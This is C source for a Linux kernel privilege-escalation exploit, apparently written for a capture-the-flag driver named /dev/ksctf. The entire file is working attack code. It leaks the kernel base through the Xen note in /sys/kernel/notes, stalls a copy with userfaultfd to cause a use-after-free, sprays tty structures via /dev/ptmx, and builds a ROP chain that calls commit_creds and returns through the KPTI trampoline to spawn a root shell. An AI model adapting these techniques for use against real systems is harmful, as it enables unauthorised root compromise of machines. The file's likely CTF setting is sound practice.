#define _GNU_SOURCE

// clang-format off

#include <errno.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <string.h>
#include <elf.h>
#include <pthread.h>
#include <sys/poll.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>

// clang-format on

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_DEFAULT "\033[0m"

#define DMSG(fmt, ...) fprintf(stderr, "[*]\t" fmt "\n", ##__VA_ARGS__)

#define IMSG(fmt, ...)                                                         \
  fprintf(stderr, COLOR_GREEN "[+]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define EMSG(fmt, ...)                                                         \
  fprintf(stderr, COLOR_RED "[-]\t" fmt "\n" COLOR_DEFAULT, ##__VA_ARGS__)

#define fatal(fmt, ...)                                                        \
  do {                                                                         \
    EMSG(fmt, ##__VA_ARGS__);                                                  \
    exit(EXIT_FAILURE);                                                        \
  } while (0)

size_t user_cs, user_ss, user_rflags, user_rsp;

#define DRIVER_NAME "/dev/ksctf"
static int ksctf_fd;
enum { KSCTF_NEW = 0xfff0, KSCTF_DEL = 0xfff1 };

struct request {
  char send[0x20];
  uint64_t bypass;
  uint64_t *recv;
};

static pthread_t monitor_thread;
static char *page = NULL;
static long page_size;
static uint64_t object_addr;
static uint64_t kbase;
static void *mmap_addr;

#define PTMX_SPRAY_NUM 0x50
static int ptmx_fd[PTMX_SPRAY_NUM];
static uint64_t kpti_bypass_offset = 0xffffffff81c00a74 - 0xffffffff81000000;
static uint64_t gadget_offset = 0xffffffff81572fb3 - 0xffffffff81000000;
static uint64_t commit_creds_offset = 0xffffffff81097d00 - 0xffffffff81000000;
static uint64_t pop_rdi_ret_offset = 0xffffffff81003e98 - 0xffffffff81000000;
static uint64_t prepare_kernel_creds_offset =
    0xffffffff81098140 - 0xffffffff81000000;
static uint64_t gadget2_offset = 0xffffffff81025c18 - 0xffffffff81000000;

#define TTY_STRUCT_MAGIC 0x0000000100005401

static int ksctf_add(uint64_t *recv) {
  struct request req = {.bypass = 1, .recv = recv};
  return ioctl(ksctf_fd, KSCTF_NEW, &req);
}

static int ksctf_delete() {
  struct request req = {.bypass = 1, .recv = NULL};
  return ioctl(ksctf_fd, KSCTF_DEL, &req);
}

void save_status() {
  DMSG("Save status...");
  asm volatile(".intel_syntax noprefix;"
               "mov user_cs, cs;"
               "mov user_ss, ss;"
               "mov user_rsp, rsp;"
               "pushf;"
               "pop user_rflags;"
               ".att_syntax prefix;");
}

void bind_core(int core) {
  DMSG("Bind core to: %d", core);
  cpu_set_t cpu_set;

  CPU_ZERO(&cpu_set);
  CPU_SET(core, &cpu_set);
  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

void register_userfaultfd(void *addr, unsigned long len,
                          void (*handler)(void *)) {
  long uffd;
  struct uffdio_api uffdio_api;
  struct uffdio_register uffdio_register;
  int s;

  /* Create and enable userfaultfd object */
  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
  if (uffd == -1)
    fatal("userfaultfd failed!");

  uffdio_api.api = UFFD_API;
  uffdio_api.features = 0;
  if (ioctl(uffd, UFFDIO_API, &uffdio_api) == -1)
    fatal("ioctl UFFDIO_API failed");

  uffdio_register.range.start = (unsigned long)addr;
  uffdio_register.range.len = len;
  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
  if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1)
    fatal("ioctl UFFDIO_REGISTER failed");

  s = pthread_create(&monitor_thread, NULL, handler, (void *)uffd);
  if (s != 0)
    fatal("pthread_create failed!");
}

void get_shell(void) {
  if (getuid()) {
    fatal("Failed to get the root!");
  }

  DMSG("Successful to get the root.");
  DMSG("execve root shell now...");

  system("/bin/sh");
  exit(0);
}

static void *fault_handler_thread(void *arg) {
  static struct uffd_msg msg;
  static int fault_cnt = 0;
  long uffd;

  struct uffdio_copy uffdio_copy;
  ssize_t nread;

  uffd = (long)arg;

  for (;;) {
    struct pollfd pollfd;
    int nready;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;
    nready = poll(&pollfd, 1, -1);

    if (nready == -1)
      fatal("poll");

    nread = read(uffd, &msg, sizeof(msg));
    if (nread == 0)
      fatal("EOF on userfaultfd!\n");
    if (nread == -1)
      fatal("read");

    if (msg.event != UFFD_EVENT_PAGEFAULT)
      fatal("Unexpected event on userfaultfd\n");

    // do something when page fault
    page = calloc(1, 0x1000);
    page_size = 0x1000;
    // memset(page, 'a', 0x100);
    *(uint64_t *)page = TTY_STRUCT_MAGIC;   // magic ref
    *(uint64_t *)(page + 8) = 0;            // dev
    *(uint64_t *)(page + 16) = object_addr; // driver
    *(uint64_t *)(page + 24) = object_addr; // ops

    // ops.ioctl
    // we can contol rdx : gadget
    // 0xffffffff81572fb3 : push qword ptr [rcx + rdx + 0x31] ; rcr byte ptr
    // [rbx + 0x5d], 0x41 ; pop rsp ; ret

    *(uint64_t *)(page + 96) = kbase + gadget_offset;
    *(uint64_t *)(page + 0x31) = object_addr + 0x100;

    // rsp
    // commit_cred(preprare_cred(0))
    *(uint64_t *)(page + 0x100) = pop_rdi_ret_offset + kbase;
    *(uint64_t *)(page + 0x100 + 8) = 0;
    *(uint64_t *)(page + 0x100 + 0x10) = prepare_kernel_creds_offset + kbase;
    // 0xffffffff81025c18 : mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi
    // ; ret
    *(uint64_t *)(page + 0x100 + 0x18) = gadget2_offset + kbase;
    *(uint64_t *)(page + 0x100 + 0x20) = 0;
    *(uint64_t *)(page + 0x100 + 0x28) = commit_creds_offset + kbase;
    // swapgs_restore_regs_and_return_to_usermode; iretq
    // mov rdi, rsp
    // -- rootshell; cs, flags, sp, ss
    *(uint64_t *)(page + 0x100 + 0x30) = kpti_bypass_offset + kbase + 49;
    *(uint64_t *)(page + 0x100 + 0x38) = 0;
    *(uint64_t *)(page + 0x100 + 0x40) = 0;
    *(uint64_t *)(page + 0x100 + 0x48) = (uint64_t)get_shell;
    *(uint64_t *)(page + 0x100 + 0x50) = user_cs;
    *(uint64_t *)(page + 0x100 + 0x58) = user_rflags;
    *(uint64_t *)(page + 0x100 + 0x60) = user_rsp;
    *(uint64_t *)(page + 0x100 + 0x68) = user_ss;

    ksctf_delete();

    for (int i = 0; i < PTMX_SPRAY_NUM; i++) {
      ptmx_fd[i] = open("/dev/ptmx", O_RDWR);
      if (ptmx_fd[i] < 0)
        fatal("open ptmx failed");
    }

    uffdio_copy.src = (unsigned long)page;
    uffdio_copy.dst =
        (unsigned long)msg.arg.pagefault.address & ~(page_size - 1);
    uffdio_copy.len = page_size;
    uffdio_copy.mode = 0;
    uffdio_copy.copy = 0;
    if (ioctl(uffd, UFFDIO_COPY, &uffdio_copy) == -1)
      fatal("ioctl UFFDIO_COPY failed");
  }
}

const char *KERNEL_NOTES_PATH = "/sys/kernel/notes";

#define XEN_ELFNOTE_ENTRY 1

#define ALIGN_UP(p, size)                                                      \
  (__typeof__(p))(((uintptr_t)(p) + ((size)-1)) & ~((size)-1))

static inline Elf64_Nhdr *get_next_elf_note(Elf64_Nhdr *note) {
  return (Elf64_Nhdr *)((uint8_t *)note + sizeof(*note) +
                        ALIGN_UP(note->n_namesz, 4) +
                        ALIGN_UP(note->n_descsz, 4));
}

static inline const char *get_name_elf_note(Elf64_Nhdr *note) {
  return note->n_namesz == 0 ? NULL : (const char *)note + sizeof(*note);
}

static inline const void *get_descript_elf_note(Elf64_Nhdr *note) {
  return note->n_descsz == 0
             ? NULL
             : (uint8_t *)note + sizeof(*note) + ALIGN_UP(note->n_namesz, 4);
}

uint64_t xen_kaslr_leak(void) {
  int retval;
  int fd;
  struct stat stat;

  fd = open(KERNEL_NOTES_PATH, O_RDONLY);
  if (fd < 0) {
    fprintf(stderr, "Error open kernel notes file %s, %s \n", KERNEL_NOTES_PATH,
            strerror(errno));
    exit(1);
  }

  retval = fstat(fd, &stat);
  if (retval < 0) {
    fprintf(stderr, "Error get stat kernel notes file %s, %s \n",
            KERNEL_NOTES_PATH, strerror(errno));
    exit(1);
  }

  char *notes_buffer = (char *)malloc(stat.st_size);
  if (notes_buffer == NULL) {
    fprintf(stderr, "Error allocate memory for kernel notes runtime, %s \n",
            strerror(errno));
    exit(1);
  }

  retval = read(fd, notes_buffer, stat.st_size);
  if (retval < 1) {
    fprintf(stderr, "Error read %s, %s \n", KERNEL_NOTES_PATH, strerror(errno));
    exit(1);
  }

  Elf64_Nhdr *xen_startup_note = (Elf64_Nhdr *)notes_buffer;
  Elf64_Nhdr *end_note = (Elf64_Nhdr *)(notes_buffer + stat.st_size);
  while (xen_startup_note < end_note) {
    const char *note_name = get_name_elf_note(xen_startup_note);
    Elf64_Word type = xen_startup_note->n_type;
    if (!strcmp(note_name, "Xen") && type == XEN_ELFNOTE_ENTRY)
      break;

    xen_startup_note = get_next_elf_note(xen_startup_note);
  }

  if (xen_startup_note > end_note) {
    fprintf(stderr, "Error not found xen entry note \n");
    exit(1);
  }

  uint64_t leak_startup_xen =
      *(uint64_t *)get_descript_elf_note(xen_startup_note);

  uint64_t offset = 0xffffffff829e1180 - 0xffffffff81000000;
  uint64_t leak_kernel_text = leak_startup_xen - offset;
  DMSG("startup_xen leaked address  -> %#lX \n", leak_startup_xen);
  return leak_kernel_text;
}

int main() {
  IMSG("STAGE 1: Initialization");
  save_status();
  bind_core(0);
  ksctf_fd = open(DRIVER_NAME, O_RDWR);
  if (ksctf_fd < 0)
    fatal("open %s failed!", DRIVER_NAME);

  ksctf_add(&object_addr);
  DMSG("Leak object @ %#lX", object_addr);

  IMSG("STAGE 2: Bypass KASLR");
  kbase = xen_kaslr_leak();
  DMSG("text leaked address @ %#lX \n", kbase);

  mmap_addr = mmap(NULL, 0x1000, PROT_WRITE | PROT_READ,
                   MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

  IMSG("STAGE 3: EoP");
  register_userfaultfd(mmap_addr, 0x1000, fault_handler_thread);

  DMSG("Trigger uffd by page fault");
  write(ksctf_fd, mmap_addr, 0x2e0);

  for (int i = 0; i < PTMX_SPRAY_NUM; i++) {
    ioctl(ptmx_fd[i], 0, object_addr, 0, 0);
  }

  // pthread_join(monitor_thread, NULL);
  return EXIT_SUCCESS;
}